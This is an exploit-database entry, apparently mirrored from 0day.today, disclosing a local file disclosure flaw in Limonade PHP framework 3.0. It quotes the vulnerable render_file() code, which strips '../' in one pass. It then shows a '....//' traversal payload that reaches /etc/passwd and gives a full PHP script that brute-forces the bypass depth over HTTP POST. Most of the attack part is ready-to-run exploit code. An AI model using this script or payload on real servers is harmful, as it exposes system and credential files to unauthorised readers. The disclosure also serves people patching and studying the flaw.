@@ -1,0 +1,140 @@
+id: 21530
+date: 11/17/2013
+title: Limonade Framework 3.0 Local File Disclosure Vulnerability
+author: yashar shahinzadeh
+cves: 
+
+###################################################################################################################################
+# Exploit Title: Limonade framework Local file disclosure filtering bypass
+# Date: 2013 17 November
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://limonade-php.github.io/‎
+# Tested on: Linux (Ubuntu), PHP 5.3.10-1ubuntu3.8 with Suhosin-Patch
+# Affected Version :  3.0 (Last)
+#
+# Contacts: {http://Twitter.com/YShahinzadeh, http://y-shahinzadeh.ir, http://Twitter.com/Mormoroth, http://mormoroth.ir}
+###################################################################################################################################
+ 
+1. Filtering bypass
+===================
+Limonade is a light framework suffering from Local file disclosure, following lines written at lib/limonade.php make the vulnerability:
+
+File: lib/limonade.php
+...
+...
+
+function render_file($filename, $return = false)
+{
+  # TODO implements X-SENDFILE headers
+  // if($x-sendfile = option('x-sendfile'))
+  // {
+  //    // add a X-Sendfile header for apache and Lighttpd >= 1.5
+  //    if($x-sendfile > X-SENDFILE) // add a X-LIGHTTPD-send-file header 
+  //   
+  // }
+  // else
+  // {
+  //   
+  // }
+  $filename = str_replace('../', '', $filename);
+  if(file_exists($filename))
+  {
+    $content_type = mime_type(file_extension($filename));
+    $header = 'Content-type: '.$content_type;
+    if(file_is_text($filename)) $header .= '; charset='.strtolower(option('encoding'));
+    send_header($header);
+    return file_read($filename, $return);
+  }
+  else halt(NOT_FOUND, "unknown filename $filename");
+}
+
+...
+...
+
+str_replace() function has been used in inefficient way which reasults in having LFD hole. Following piece of code can be used to demonstrade it:
+
+<?php
+require_once dirname(dirname(__FILE__)).'/lib/limonade.php';
+ 
+function configure()
+{
+    option('env', ENV_DEVELOPMENT);
+}
+ 
+dispatch('/','index');
+function index()
+{
+    set('page_title', "using content_for()");
+}
+   
+dispatch_post('/file/:file','FileContents');
+function FileContents()
+{
+    params($_POST);
+    var_dump(render_file(params('file')));
+}
+ 
+run();
+?>
+
+What will happen if HTTP request below is sent:
+....//....//....//....//etc/passwd
+Apparently, immediate filtering system applies a replacement which produces:
+../../../../etc/passwd
+
+Here is the exploit:
+
+<?php
+/** To prevent of time out **/
+set_time_limit(0);
+ 
+/** Error reporting **/
+error_reporting(0);
+ 
+/** Necessary variables **/
+$url = $argv[1];
+$data = $argv[2];
+$needle = $argv[3];
+ 
+/** Curl function with appropriate adjustments **/
+function CurlPost($url='localhost',$data=array())
+{
+    $ch = curl_init();
+    curl_setopt($ch,CURLOPT_URL,$url);
+    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);
+    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
+    curl_setopt($ch,CURLOPT_HEADER,1);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+    curl_setopt($ch,CURLOPT_TIMEOUT,50);
+    curl_setopt($ch,CURLOPT_POST,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
+    return curl_exec($ch);
+    curl_close($ch);
+}
+ 
+list($param,$file) = explode(':',$data);
+ 
+$FilterBypassing = '....//';
+for($i=0;$i<10;$i++)
+{
+    $DataToPost[$param] = $FilterBypassing.$file;
+    $response = CurlPost($url,$DataToPost);
+    if(strstr($response,$needle)!==FALSE)
+    {
+        echo $response;
+        echo "\n\nExploited successfully!\n";
+        echo 'Payload: ',$DataToPost[$param],"\n\n\n";
+        die();
+    }
+     
+    $FilterBypassing .= '....//';
+}
+?>
+
+Illustration: http://blog.y-shahinzadeh.ir/posts-images/limonade/1.jpg
+
+/** Yasshar shahinzadeh **/
+
+#  0day.today [2023-03-27]  #
